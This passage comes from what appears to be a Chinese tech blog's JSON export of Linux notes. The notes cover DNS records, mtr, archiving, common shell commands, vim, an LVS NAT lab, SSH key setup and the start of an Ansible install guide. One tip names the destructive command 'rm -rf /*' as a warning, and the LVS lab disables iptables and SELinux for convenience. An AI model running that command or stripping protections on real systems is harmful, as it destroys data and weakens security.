mxdomain.qq.com. ;; Query time: 30 msec ;; SERVER: 192.168.1.1#53(192.168.1.1) ;; WHEN: Sat Jan 7 10:45:24 2017 ;; MSG SIZE rcvd: 60##常用术语 记录类型 A记录：将域名指向一个IPv4地址（例如：10.10.10.10），需要增加A记录CNAME记录：如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录MX记录：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录NS记录：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录TXT记录：可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用AAAA记录：将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录SRV记录：记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp） 22.主机记录www ：将域名解析为www.example.com，填写www；@ ：将域名解析为example.com（不带www），填写@或者不填写；mail ：将域名解析为mail.example.com，通常用于解析邮箱服务器； ：泛解析，所有子域名均被解析到统一地址（除单独设置的子域名解析）；二级域名 ：如：mail.example.com或abc.example.com，填写mail或abc；手机网站 ：如：m.example.com，填写m。 mtrMTR是Linux平台上一款非常好用的网络诊断工具，集成了traceroute、ping、nslookup的功能，用于诊断网络状态非常有用。下面请看简单介绍 安装 [root@node-lvs-master ~]# yum -y install mtr使用 第一列（Host）：IP地址和域名，按n键可以切换IP和域名第二列（Loss%）：丢包率第三列（Snt）：设置每秒发送数据包的数量，默认值是10 可以通过参数-c来指定第四列（Last）：最近一次的PING值第五、六、七列（Avg、Best、Wrst）：分别是PING的平均、最好、最差值第八列（StDev）：标准偏差 [root@CTN-QD-247 fangwenjun]# mtr www.upyun.com My traceroute [v0.75] CTN-QD-247 (0.0.0.0) Sat Jan 7 11:48:30 2017 Keys: Help Display mode Restart statistics Order of fields quit Packets Pings Host Loss% Snt Last Avg Best Wrst StDev 1. 121.42.139.248 0.0% 36 0.6 0.6 0.5 0.9 0.1 2. ??? 3. 10.108.72.74 0.0% 35 73.0 95.2 0.6 146.9 38.4 4. 106.11.130.214 0.0% 35 0.3 0.4 0.3 1.1 0.2 5. 42.120.244.77 0.0% 35 11.6 1.8 0.5 13.8 3.0 6. 27.221.85.245 0.0% 35 682.2 826.9 608.6 1398. 152.3 7. 27.221.94.145 0.0% 35 8.5 9.0 5.6 12.7 2.1 8. 219.158.107.242 0.0% 35 23.3 22.4 20.5 24.4 1.3 9. 124.160.82.130 0.0% 35 20.5 23.1 20.5 50.4 6.9 10. 124.160.82.198 0.0% 35 24.5 24.5 24.4 24.6 0.0 11. ???","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux下的压缩命令","slug":"Linux下的压缩命令","date":"2017-06-14T11:54:33.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/2227619961.html","link":"","permalink":"https://awen.me/posts/2227619961.html","excerpt":"Linux的常用压缩命令gzip[root@CTN-QD-247 ~]# ls access.log lnmp-install.log upgrade_nginx20161230153452.log [root@CTN-QD-247 ~]# gzip lnmp-install.log ##压缩后会删除原文件 [root@CTN-QD-247 ~]# ls access.log lnmp-install.log.gz upgrade_nginx20161230153452.log [root@CTN-QD-247 ~]# gzip -d lnmp-install.log.gz ##解压缩，但是会删除压缩包 [root@CTN-QD-247 ~]# ls access.log lnmp-install.log upgrade_nginx20161230153452.log##bzip2 用法同上 ##tar","text":"Linux的常用压缩命令gzip[root@CTN-QD-247 ~]# ls access.log lnmp-install.log upgrade_nginx20161230153452.log [root@CTN-QD-247 ~]# gzip lnmp-install.log ##压缩后会删除原文件 [root@CTN-QD-247 ~]# ls access.log lnmp-install.log.gz upgrade_nginx20161230153452.log [root@CTN-QD-247 ~]# gzip -d lnmp-install.log.gz ##解压缩，但是会删除压缩包 [root@CTN-QD-247 ~]# ls access.log lnmp-install.log upgrade_nginx20161230153452.log##bzip2 用法同上 ##tar 解压 [root@node-lvs-master src]# tar -zxf nginx-1.11.8.tar.gz ## 不显示进度 [root@node-lvs-master src]# tar -zxvf nginx-1.11.8.tar.gz ## 显示进度 nginx-1.11.8/ nginx-1.11.8/auto/ nginx-1.11.8/conf/ nginx-1.11.8/contrib/ nginx-1.11.8/src/ nginx-1.11.8/configure nginx-1.11.8/LICENSE nginx-1.11.8/README nginx-1.11.8/html/参数: z 打包后通过gzip压缩f 指定打包后的文件名j 通过bzip2进行压缩-C 指定解压缩的路径-c 创建压缩文件-x 释放压缩文件-t 列出打包文档的内容 压缩 [root@node-lvs-master src]# tar cvf nginx.tar.gz nginx-1.11.8/ ## 创建一个gz的压缩文件 [root@node-lvs-master src]# tar cjf nginx-1.11.8.tar.bz2 nginx-1.11.8/ ##创建一个bz2的压缩文件 [root@node-lvs-master src]# ls debug kernels nginx-1.11.8 nginx-1.11.8.tar.bz2查看压缩包内容，但不解压 [root@node-lvs-master src]# tar -tf nginx-1.11.8.tar.gz history查看历史命令 [root@node-lvs-master src]# history 1 exit 2 pwd 3 exit 小贴士：使用!加history中的行号可以快速执行对应的命令，例如!2 就执行pwd命令","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 常用命令","slug":"Linux-常用命令","date":"2017-06-14T11:54:01.000Z","updated":"2021-02-26T06:05:29.255Z","comments":true,"path":"posts/2172419458.html","link":"","permalink":"https://awen.me/posts/2172419458.html","excerpt":"Linux 常用的命令ls命令","text":"Linux 常用的命令ls命令 -l 可以查文件的属性 [root@node-lvs-master ~]# ls -l total 20 -rw-------. 1 root root 1439 Jan 6 17:31 anaconda-ks.cfg -rw-r--r--. 1 root root 9913 Jan 6 17:31 install.log -rw-r--r--. 1 root root 3161 Jan 6 17:30 install.log.syslog 提示: - rw- — — 三个一组，第一组是所属组 第二组 所有者 第三组 其他人 r 可读 w可写 x 可执行 d 目录 l表示软链接 -a 可以显示所有的文件 包括隐藏的文件 [root@node-lvs-master ~]# ls -a . .. anaconda-ks.cfg .bash_history .bash_logout .bash_profile .bashrc .cshrc install.log install.log.syslog .ssh .tcshrc .xxx.log-u 参数 显示最后的访问时间 [root@node-lvs-master ~]# ls -lu /etc/ssh/sshd_config -rw-------. 1 root root 3880 Jan 6 19:34 /etc/ssh/sshd_config-t 以最后修改时间显示 [root@node-lvs-master ~]# ls -alt total 56 dr-xr-x---. 3 root root 4096 Jan 6 19:47 . -rw-r--r--. 1 root root 0 Jan 6 19:47 .xxx.log drwx------. 2 root root 4096 Jan 6 19:38 .ssh -rw-------. 1 root root 32 Jan 6 19:36 .bash_history dr-xr-xr-x. 22 root root 4096 Jan 6 17:31 .. -rw-------. 1 root root 1439 Jan 6 17:31 anaconda-ks.cfg -rw-r--r--. 1 root root 9913 Jan 6 17:31 install.log -rw-r--r--. 1 root root 3161 Jan 6 17:30 install.log.syslog -rw-r--r--. 1 root root 18 May 20 2009 .bash_logout -rw-r--r--. 1 root root 176 May 20 2009 .bash_profile -rw-r--r--. 1 root root 129 Dec 4 2004 .tcshrc -rw-r--r--. 1 root root 176 Sep 23 2004 .bashrc -rw-r--r--. 1 root root 100 Sep 23 2004 .cshrc man 查命令的详细使用文档，如果系统没有 yum -y install man使用 man [command]例如 [root@node-lvs-master ~]# man whereis WHEREIS(1) WHEREIS(1) ……whereis 查看命令的路径 [root@node-lvs-master ~]# whereis --help whereis [ -sbmu ] [ -SBM dir ... -f ] name...例如： [root@node-lvs-master ~]# whereis ls ls: /bin/ls /usr/share/man/man1/ls.1.gzmkdir 创建目录 [root@node-lvs-master ~]# mkdir aaq [root@node-lvs-master ~]# ls aaq anaconda-ks.cfg install.log install.log.syslogtouch创建一个空文件或修改文件的时间 [root@node-lvs-master aaq]# touch aaa ##创建一个空文件 [root@node-lvs-master aaq]# ll total 0 -rw-r--r--. 1 root root 0 Jan 6 20:04 aaa ##注意时间，大小为0的空文件 [root@node-lvs-master aaq]# touch aaa ##再次执行，文件已存在，则修改文件的时间 [root@node-lvs-master aaq]# ll total 0 -rw-r--r--. 1 root root 0 Jan 6 20:05 aaacp拷贝 cp 源文件 目标文件 cp -rf 源文件 目标文件##rm 删除 [root@node-lvs-master aaq]# rm aaa rm: remove regular empty file `aaa&apos;? y [root@node-lvs-master aaq]# rm -rf bbb [root@node-lvs-master aaq]# mkdir aa [root@node-lvs-master aaq]# cd aa/ [root@node-lvs-master aa]# touch a b c [root@node-lvs-master aa]# ls a b c [root@node-lvs-master aa]# cd .. [root@node-lvs-master aaq]# ls aa lscpu [root@node-lvs-master aaq]# rm aa/ rm: cannot remove `aa/&apos;: Is a directory [root@node-lvs-master aaq]# rm -rf aa/ ## 加-rf 可以强制删除目录和目录下的所有文件 [root@node-lvs-master aaq]# 参数 -r 删除目录以及目录下面的所有文件-f 强制删除，没有提示-i 会给出提示 小贴士: 慎用例如rm -rf /* 会破坏系统 ##mv mv 移动或剪切 mv 源文件 目标文件find查找文件 1.按文件名去查-name [root@node-lvs-master ~]# find -name &quot;*.xxx.log&quot; ./.xxx.log2.查找所有后缀*.log的文件 ./.xxx.log [root@node-lvs-master ~]# find /var/log/ &quot;*.log&quot; /var/log/ /var/log/lastlog /var/log/btmp /var/log/wtmp /var/log/messages /var/log/spooler /var/log/yum.log /var/log/anaconda.xlog /var/log/boot.log /var/log/audit /var/log/audit/audit.log3.查空文件 [root@node-lvs-master z]# find /home/z/ -empty4.按所属组查 [root@node-lvs-master z]# find /home/zengdan/ -group z5.查所有3天内被修改过的文档 #find / -mtime -36.查3天前被修改过的文档 #find / -mtime +37.根据文件大小去查 #find / -size +10M //大于10M的文件8.根据文件类型来查 #find / -type f #表示查普通文件9.根据用户来查 #find / -user tom10.查完文件并列出详细信息 #find / -size +1M -exec ls -l {} \\;11.查大于1M的所有普通文件 #find / -size +1M -a -type fdu计算文件或目录的容量 [root@node-lvs-master src]# du 4 ./debug 4 ./kernels 12 . [root@node-lvs-master src]# du -h #人性化显示 4.0K ./debug 4.0K ./kernels 12K . [root@node-lvs-master src]# du -sh #显示总容量 12K .##cat 查看文件内容，一般和管道符搭配使用 [root@node-lvs-master src]# cat /etc/ssh/sshd_config | more1.统计文件行数 [root@node-lvs-master src]# cat -n /etc/ssh/sshd_config //显示空白行 [root@node-lvs-master src]# cat -b /etc/ssh/sshd_config //不显示空白行##more 分页查内容 ##less 分页查内容 ##head查文件前多少行或多少大小的内容 [root@node-lvs-master src]# head -n 10 /etc/ssh/sshd_config #查头10行的内容 [root@node-lvs-master src]# head -c 10K /etc/ssh/sshd_config #查10k的内容##tail 查文件末尾的多少行内容 tail -f /var/log/nginx #动态显示还有-n和-c和head一样 wc统计文件内容之类的信息 [root@node-lvs-master src]# wc /etc/ssh/sshd_config #依次显示文件的行数 单词数和字节数 138 467 3880 /etc/ssh/sshd_config [root@node-lvs-master src]# wc -c /etc/ssh/sshd_config 3880 /etc/ssh/sshd_config [root@node-lvs-master src]# wc -l /etc/ssh/sshd_config 138 /etc/ssh/sshd_config [root@node-lvs-master src]# wc -w /etc/ssh/sshd_config 467 /etc/ssh/sshd_configgrep[root@CTN-QD-247 wwwlogs]# grep &apos;115.231.101.171&apos; access.log ##过滤115.231.101.171的所有内容 [root@CTN-QD-247 wwwlogs]# grep -v --color &apos;POST&apos; access.log //过滤不包含POST的内容，并对关键词进行颜色高亮显示##echo 在标准输出中显示内容 #ehco &quot;aaa&quot; [root@CTN-QD-247 wwwlogs]# echo -e &quot;\\&quot; #需要加双斜杠，否则会被转义 &gt; ^C [root@CTN-QD-247 wwwlogs]# echo -e &quot;\\&quot;&quot;ln软硬链接 [root@CTN-QD-247 wwwlogs]# ls access.log nginx_error.log [root@CTN-QD-247 wwwlogs]# pwd /home/wwwlogs [root@CTN-QD-247 wwwlogs]# ln -s access.log /root/ #创建软链接不加-s是硬链接 [root@CTN-QD-247 wwwlogs]# cd /root/ [root@CTN-QD-247 ~]# ls access.log lnmp-install.log upgrade_nginx20161230153452.log [root@CTN-QD-247 ~]# ll total 2700 lrwxrwxrwx 1 root root 10 Jan 6 21:39 access.log -&gt; access.log -rw-r--r-- 1 root root 2264387 Dec 30 15:10 lnmp-install.log -rw-r--r-- 1 root root 494739 Dec 30 15:40 upgrade_nginx20161230153452.log","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"vim笔记","slug":"vim笔记","date":"2017-06-14T11:53:25.000Z","updated":"2021-02-26T06:05:29.293Z","comments":true,"path":"posts/2429924585.html","link":"","permalink":"https://awen.me/posts/2429924585.html","excerpt":"VIM在lINUX的世界里 有2种著名编辑器，一个叫VI（VIM），神一样的编辑器，另一个叫emacs，编辑器之神 GVIM 图形化界面的vim","text":"VIM在lINUX的世界里 有2种著名编辑器，一个叫VI（VIM），神一样的编辑器，另一个叫emacs，编辑器之神 GVIM 图形化界面的vim VIM的工作模式普通模式：实现光标的移动、一些快捷键命令行模式：可以实现保存、退出等操作插入模式：编辑文本内容 ##常用按键 1.光标移动 H 左移动一个字符J 下移动一行K上移动一行L 右移动一个字符GG 跳转到文末gg 跳转到文首nG n=行号移动到某一行的行首$ 行尾^ 行首w 向右移动一个单词（空格区分一个单词）b 同上，向左移动一个单词nw 向右移动n个单词nb 向左移动n个单词fx 向右移动到x字符处Fx 向左移动到x字符处 编辑模式的一些按键a在光标的后面插入内容o 在当前行下插入空行O 在当前行上插入空行A 在行尾插入I 在行首插入i 光标前 ##编辑文档 x 删除当前光标的字符dd 删除，也是剪切ndd n为行号，意思为删除多少行u 撤销d$ 删除当前光标所在位置到行尾J 合并行rx 将当前内容替换为xyy 复制p 粘贴至当前行后P粘贴至当前行前 查找和替换:s/root/admin [:s@root@admin] 替换当前行的root为admin:s/22/65422/g 替换当前行所有22为65422:3,5 s/root/admin/g 替换3-5行之间的所有root为admin:10,13 s//usr/bin//usr/sbin/g [:10,13 s@/usr/bin@/usr/sbin@g ] 路径要加转义符:% s/65422/22/g 将所有行的65422替换为22:% s/^////g 在全部内容的行首添加//号注释:2,50 s/^////g 在250行首添加//号注释:2,50 s/^////g 在250行首删除//号 退出和保存:q! 不保存直接退出:wq 保存并退出,:w 保存:wq /opt/ww.txt 保存到指定位置并且退出[另存为] vimrc可以自定义vim的配色 快捷键等等。github有很多现成的配置文件可供参考。","categories":[],"tags":[{"name":"vim","slug":"vim","permalink":"https://awen.me/tags/vim/"}]},{"title":"lvs nat模式","slug":"lvs-nat模式","date":"2017-06-14T11:52:19.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/131270620.html","link":"","permalink":"https://awen.me/posts/131270620.html","excerpt":"","text":"理论知识详见:http://www.linuxvirtualserver.org/VS-NAT.html LVS 角色 Virtual IP（VIP）: 叫虚拟IP地址Director Server(DR): 实际IP地址real server： 节点 ip 工作原理当用户访问服务器集群提供的服务时，发往虚拟IP地址的请求数据包（负载平衡器的外部IP地址）到达负载平衡器。负载均衡器检查数据包的目的地址和端口号。如果根据虚拟服务器规则表匹配虚拟服务器服务，则通过调度算法从群集中选择真实服务器，并将连接添加到记录建立的连接的哈希表中。然后，将目的地地址和分组的端口重写为所选服务器的目的地址和端口，并将数据包转发到服务器。当传入的分组属于此连接并且可以在哈希表中找到所选择的服务器时，该分组将被重写并转发到所选择的服务器。当回复报文返回时，负载平衡器将报文的源地址和端口重写为虚拟业务的源地址和端口。连接终止或超时后，连接记录将在哈希表中删除。 三台设备的配置如下 服务器 IP 说明 master VIP:192.168.1.117 Director Server: 172.10.100.128 VIP master-backup VIP:192.168.1.118 Director: Server172.10.100.129 VIP Real Server Real Server: 172.10.100.130 real 1节点 Real Server Real Server: 172.10.100.131 real 2节点 master 开启地址转发[root@node-lvs-master ~]# echo &apos;net.ipv4.ip_forward = 1&apos; &gt;&gt;/etc/sysctl.conf [root@node-lvs-master ~]# sysctl -p安装lvs[root@node-lvs-master ~]# yum -y install ipvsadm 注意：最好关闭所有设备的iptables和selinux,反正是实验，开端口麻烦。 [root@node-lvs-master ~]# /etc/init.d/iptables stop [root@node-lvs-master ~]# setenforce 0 #临时关闭 [root@node-lvs-master ~]# sed -i s@SELINUX=enforcing@SELINUX=disabled@g /etc/selinux/config 先访问130 130配置 在访问131 131配置 配置lvs[root@node-lvs-master ~]# ipvsadm -C [root@node-lvs-master ~]# ipvsadm -A -t 192.168.1.117:80 -s wlc #添加 vip [root@node-lvs-master ~]# ipvsadm -a -t 192.168.1.117:80 -r 172.10.100.130:80 -m #添加子节点 [root@node-lvs-master ~]# ipvsadm -a -t 192.168.1.100:80 -r 172.10.100.131:80 -m 然后请求，发现 state一直都是在SYN_RECV状态，上面我们访问了2个子节点都是可以正常访问的。那也就是说VIP 节点有问题，SYN_RCVD是TCP三次握手的中间状态，是服务端口（监听端口，如应用服务器的80端口）收到SYN包并发送[SYN，ACK]包后所处的状态。这时如果再收到ACK的包，就完成了三次握手，建立起TCP连接。也就是说目前还没建立连接，是什么原因呢？ [root@server ~]# ipvsadm -Lnc IPVS connection entries pro expire state source virtual destination TCP 00:34 SYN_RECV 192.168.1.103:57450 192.168.1.117:80 172.10.100.131:80 TCP 00:59 SYN_RECV 192.168.1.103:57545 192.168.1.117:80 172.10.100.131:80 TCP 00:35 SYN_RECV 192.168.1.103:57451 192.168.1.117:80 172.10.100.130:80 TCP 00:59 SYN_RECV 192.168.1.103:57547 192.168.1.117:80 172.10.100.131:80 TCP 00:59 SYN_RECV 192.168.1.103:57546 192.168.1.117:80 172.10.100.130:80排查防火墙是关闭的，查看ipvsadm 进程，果然，进程没开启 [root@server ~]# systemctl status ipvsadm -l ● ipvsadm.service - Initialise the Linux Virtual Server Loaded: loaded (/usr/lib/systemd/system/ipvsadm.service; enabled; vendor preset: disabled) Active: failed (Result: exit-code) since Sun 2017-07-09 00:03:03 EDT; 11s ago Process: 3007 ExecStart=/bin/bash -c exec /sbin/ipvsadm-restore &lt; /etc/sysconfig/ipvsadm (code=exited, status=1/FAILURE) Main PID: 3007 (code=exited, status=1/FAILURE) Jul 09 00:03:03 server systemd[1]: Starting Initialise the Linux Virtual Server... Jul 09 00:03:03 server bash[3007]: /bin/bash: /etc/sysconfig/ipvsadm: No such file or directory Jul 09 00:03:03 server systemd[1]: ipvsadm.service: main process exited, code=exited, status=1/FAILURE Jul 09 00:03:03 server systemd[1]: Failed to start Initialise the Linux Virtual Server. Jul 09 00:03:03 server systemd[1]: Unit ipvsadm.service entered failed state. Jul 09 00:03:03 server systemd[1]: ipvsadm.service failed. 奇怪，启动失败，提示/etc/sysconfig/ipvsadm没有这个文件 [root@server ~]# touch /etc/sysconfig/ipvsadm [root@server ~]# systemctl restart ipvsadm [root@server ~]# systemctl status ipvsadm -l ● ipvsadm.service - Initialise the Linux Virtual Server Loaded: loaded (/usr/lib/systemd/system/ipvsadm.service; enabled; vendor preset: disabled) Active: active (exited) since Sun 2017-07-09 00:04:50 EDT; 2s ago Process: 3021 ExecStart=/bin/bash -c exec /sbin/ipvsadm-restore &lt; /etc/sysconfig/ipvsadm (code=exited, status=0/SUCCESS) Main PID: 3021 (code=exited, status=0/SUCCESS) Jul 09 00:04:50 server systemd[1]: Starting Initialise the Linux Virtual Server... Jul 09 00:04:50 server systemd[1]: Started Initialise the Linux Virtual Server. 然后发现 ipvs表没了，然后重新添加，额，提示内存分配问题。这又是什么鬼！！ [root@server ~]# ipvsadm -Lnc IPVS connection entries pro expire state source virtual destination [root@server ~]# ipvsadm -L IP Virtual Server version 1.2.1 (size=4096) Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConn [root@server ~]# ipvsadm -C [root@server ~]# ipvsadm -A -t 192.168.1.117:80 -s wlc [root@server ~]# ipvsadm -a -t 192.168.1.117:80 -r 172.10.100.130:80 -m [root@server ~]# ipvsadm -a -t 192.168.1.100:80 -r 172.10.100.131:80 -m Memory allocation problem尝试重启下，发现直接报错， 于是卸载了 ipvsadm，发现还是无法访问。 lvs的算法常见的有八种 轮询调度：RR 按依次循环的方式请求调度到不同的服务器，特点是简单，平均分配给每台服务器 加权轮询调度：WRR，对RR的一种补充和优化，给每台服务器一个权重，假如A为1,B为2，则优先调度A，权重值越高处理的请求越多 最小连接调度：LC，把请求调度到连接数最小的服务器上 加权最小连接调度 WLC，给每个服务器一个权值，调度尽可能保证每台服务器的均衡 基于局部性最少的连接:lblc，请求数据包的目标IP地址的一种调度算法，先根据目标IP地址寻找最近的该目标地址的所使用的服务器，如果服务器可用并且有能力处理请求，则调度算法会尽可能的选择相同的服务器，否则选择其他 带复制的基于局部性的最少连接：lblcr，它记录的不是一个目标IP与另外一台服务器直接的连接记录，它维护的是一个目标IP到一组服务器直接的映射关系，防止单点负载过高 目标地址散列调度:DH，根据目标地址通过散列函数将目标IP与服务器建立映射关系，出现服务器不可用或负载高，发往该服务器的请求会会固定发往该服务器。 源地址散列调度：SH，与上面的类似，但是它是根据源地址散列算法进行静态分配固定的服务器资源。 ipvs的命令详解选项： 选项： -A 添加一个虚拟服务，使用IP地址、端口号、协议来唯一定义一个虚拟服务-E 编辑一个虚拟服务-D 删除一个虚拟服务-C 清空虚拟服务-R 从标准输入中还原虚拟服务规则-S 保存虚拟服务规则到标准输出，输入的规则可以使用-R导入还原-a 在虚拟服务中添加一个真实的服务器-e 在虚拟服务中编辑一台真是的服务器-d 在虚拟的服务中删除一台真是的服务器-L 显示虚拟服务器列表-t 使用tcp协议，该参数后需跟主机与端口-u 使用UDP，该参数后需跟主机与端口-s 使用LVS所采用的调度算法-r 设置真是服务器的IP和端口信息-g 设置LVS工作模式为DR直连路由模式-i 设置LVS工作模式为TUN隧道模式-m 设置LVS的工作模式为NAT模式-w 设置服务器的权重-c 链接状态 需要配合L使用-n 数字格式输出","categories":[],"tags":[{"name":"lvs","slug":"lvs","permalink":"https://awen.me/tags/lvs/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://awen.me/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"}]},{"title":"ssh 服务讲解","slug":"ssh-服务讲解","date":"2017-06-14T11:51:49.000Z","updated":"2021-02-26T06:05:29.292Z","comments":true,"path":"posts/3188032426.html","link":"","permalink":"https://awen.me/posts/3188032426.html","excerpt":"ssh讲解一种安全的远程终端连接程序，他可以通过rsa等非对称算法进行加密数据。ssh 默认的端口是22","text":"ssh讲解一种安全的远程终端连接程序，他可以通过rsa等非对称算法进行加密数据。ssh 默认的端口是22 有密码的连接ssh username@ip [-p port]ssh 无密码连接1.创建ssh密钥，通过ssh-keygen -t rsa 可以创建一个2048位的密钥 [root@node-lvs-master ~]# ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory &apos;/root/.ssh&apos;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is: 02:2b:c6:c7:f8:e0:1b:47:3b:f4:b7:3a:97:92:26:88 root@node-lvs-master The key&apos;s randomart image is: +--[ RSA 2048]----+ | | | | | . | | . o o | | * * . S | | o B o . | | .o.= .... | |E .+..=.o. | | . o.=. | +-----------------+2.在主目录的~/.ssh目录下游2个文件id_rsa 是私钥，*.pub是公钥 [root@node-lvs-master ~]# cd ~/.ssh/ [root@node-lvs-master .ssh]# ls id_rsa id_rsa.pub3.远程到其他服务器，我们可以copy公钥过去，我们需要先安装openssh-clients [root@node-lvs-master .ssh]# yum -y install openssh-clients4.然后执行ssh-copy-id username@ip -p port 输入密码后，类似如下 [root@node-lvs-master .ssh]# ssh-copy-id root@10.2.100.129 The authenticity of host &apos;10.2.100.129 (10.2.100.129)&apos; can&apos;t be established. RSA key fingerprint is f3:57:c2:9c:1a:b0:7a:2a:7d:cc:d1:7e:d5:eb:13:0a. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;10.2.100.129&apos; (RSA) to the list of known hosts. root@10.2.100.129&apos;s password: Now try logging into the machine, with &quot;ssh &apos;root@10.2.100.129&apos;&quot;, and check in: .ssh/authorized_keys to make sure we haven&apos;t added extra keys that you weren&apos;t expecting.5.之后，你要远程目标服务器，就可以 [root@node-lvs-master .ssh]# ssh root@10.2.100.129 Last login: Fri Jan 6 19:02:51 2017 from 10.2.100.1 [root@node-nginx-1 ~]# 配置ssh服务编辑/etc/ssh/sshd_config配置文件 [root@node-lvs-master .ssh]# cat /etc/ssh/sshd_config # $OpenBSD: sshd_config,v 1.80 2008/07/02 02:24:18 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/usr/local/bin:/bin:/usr/bin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options change a # default value. Port 65422 #修改端口 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: # Disable legacy (protocol version 1) support in the server for new # installations. In future the default will change to require explicit # activation of protocol 1 Protocol 2 #ssh的版本 # HostKey for protocol version 1 #HostKey /etc/ssh/ssh_host_key # HostKeys for protocol version 2 #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_dsa_key # Lifetime and size of ephemeral version 1 server key #KeyRegenerationInterval 1h #ServerKeyBits 1024 # Logging # obsoletes QuietMode and FascistLogging #SyslogFacility AUTH SyslogFacility AUTHPRIV #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin no # 禁止或允许root用户登录 yes为运行 no为禁止 #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #RSAAuthentication yes #PubkeyAuthentication yes #AuthorizedKeysFile .ssh/authorized_keys # 在.ssh中执行cat id_rsa.pub &gt;&gt;authorized_keys #AuthorizedKeysCommand none #AuthorizedKeysCommandRunAs nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #RhostsRSAAuthentication no # similar for protocol version 2 #HostbasedAuthentication no # Change to yes if you don&apos;t trust ~/.ssh/known_hosts for # RhostsRSAAuthentication and HostbasedAuthentication #IgnoreUserKnownHosts no # Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! #PasswordAuthentication yes #PermitEmptyPasswords no PasswordAuthentication yes #禁止或运行密码登录 # Change to no to disable s/key passwords #ChallengeResponseAuthentication yes ChallengeResponseAuthentication no # Kerberos options #KerberosAuthentication no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes #KerberosGetAFSToken no #KerberosUseKuserok yes # GSSAPI options #GSSAPIAuthentication no GSSAPIAuthentication yes #GSSAPICleanupCredentials yes GSSAPICleanupCredentials yes #GSSAPIStrictAcceptorCheck yes #GSSAPIKeyExchange no # Set this to &apos;yes&apos; to enable PAM authentication, account processing, # and session processing. If this is enabled, PAM authentication will # be allowed through the ChallengeResponseAuthentication and # PasswordAuthentication. Depending on your PAM configuration, # PAM authentication via ChallengeResponseAuthentication may bypass # the setting of &quot;PermitRootLogin without-password&quot;. # If you just want the PAM account and session checks to run without # PAM authentication, then enable this but set PasswordAuthentication # and ChallengeResponseAuthentication to &apos;no&apos;. #UsePAM no UsePAM yes # Accept locale-related environment variables AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE AcceptEnv XMODIFIERS #AllowAgentForwarding yes #AllowTcpForwarding yes #GatewayPorts no #X11Forwarding no X11Forwarding yes #X11DisplayOffset 10 #X11UseLocalhost yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #UsePrivilegeSeparation yes #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #ShowPatchLevel no #UseDNS yes #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/openssh/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # ForceCommand cvs server##重启 /etc/init.d/sshd [restart|start|stop]","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"ansible 学习笔记","slug":"ansible-学习笔记","date":"2017-06-14T11:51:04.000Z","updated":"2021-02-26T06:05:29.269Z","comments":true,"path":"posts/4263580510.html","link":"","permalink":"https://awen.me/posts/4263580510.html","excerpt":"在学习linux过程中，经常需要重复给多台虚拟主机配置相同的配置，如果每次都要在对应的主机上做相同的操作，真的烦不胜烦，于是可以用ansible来管理多台主机，同样ansible也适用于小型或大型的生产环境中。编写好“剧本”就可以让ansible“唱戏” ansible国内比较好的文档http://ansible-tran.readthedocs.io","text":"在学习linux过程中，经常需要重复给多台虚拟主机配置相同的配置，如果每次都要在对应的主机上做相同的操作，真的烦不胜烦，于是可以用ansible来管理多台主机，同样ansible也适用于小型或大型的生产环境中。编写好“剧本”就可以让ansible“唱戏” ansible国内比较好的文档http://ansible-tran.readthedocs.io Centos 安装在学习linux过程中，经常需要重复给多台虚拟主机配置相同的配置，如果每次都要在对应的主机上做相同的操作，真的烦不胜烦，于是可以用ansible来管理多台主机，同样ansible也适用于小型或大型的生产环境中。编写好“剧本”就可以让ansible“唱戏”1.需要安装epel源 wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm sudo rpm -Uvh epel-release-6*.rpm2.然后执行 yum -y install ansibleUbuntu 安装其实我是比较喜欢用 Ubuntu 的，大部分主流开源软件直接 sudo apt-get 就可以安装，那么安装 ansible 直接使用 sudo apt-get install ansible就可以，然后查看 